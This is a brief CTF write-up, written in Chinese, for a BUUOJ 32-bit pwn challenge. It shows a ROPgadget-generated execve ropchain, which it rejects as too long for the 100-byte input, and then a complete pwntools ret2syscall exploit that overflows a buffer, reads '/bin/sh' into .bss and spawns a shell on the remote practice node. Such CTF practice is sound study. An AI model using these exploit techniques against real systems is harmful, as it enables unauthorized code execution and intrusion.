+++
title = "wp"
date = "2026-04-23"
type = "post"
categories = ['BUU']
tags = ['第二页', '2-4', '2-4-2']
draft = false
+++
Pasted image 20260421190124.png
直接去问ROPgadget要ropchain
```python
p = b''

p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bae06) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bae06) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054250) # xor eax, eax ; ret
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806e851) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054250) # xor eax, eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x080493e1) # int 0x80
```
但实际上这是不行的，因为只给了100个字节的输入。
同时这里没有system和binsh
尝试ret2libc
这个显然也是不可以的
最后选择了ret2syscall
```python
from pwn import *  
  
context.arch = 'i386'  
context.os = 'linux'  
context.log_level = 'debug'  
  
#io = process('./pwn')  
io = remote('node5.buuoj.cn', 27926)  
read_addr = 0x806cd50  
bss = 0x80eaf80  
pop_eax = 0x80bae06  
pop_edx_ecx_ebx = 0x806e850  
int_80 = 0x806eef0  
  
offset = 32  
  
payload = flat(  
    b'A' * offset,  
    read_addr,  
    pop_edx_ecx_ebx,   # read 返回后清理 3 个参数  
    0,                 # fd  
    bss,               # buf  
    8,                 # size  
    pop_eax,  
    11,                # eax = __NR_execve  
    pop_edx_ecx_ebx,  
    0,                 # edx = 0  
    0,                 # ecx = 0  
    bss,               # ebx = "/bin/sh\x00"  
    int_80  
)  
  
io.sendafter(b'Your input :', payload)  
io.send(b'/bin/sh\x00')  
io.interactive()
```
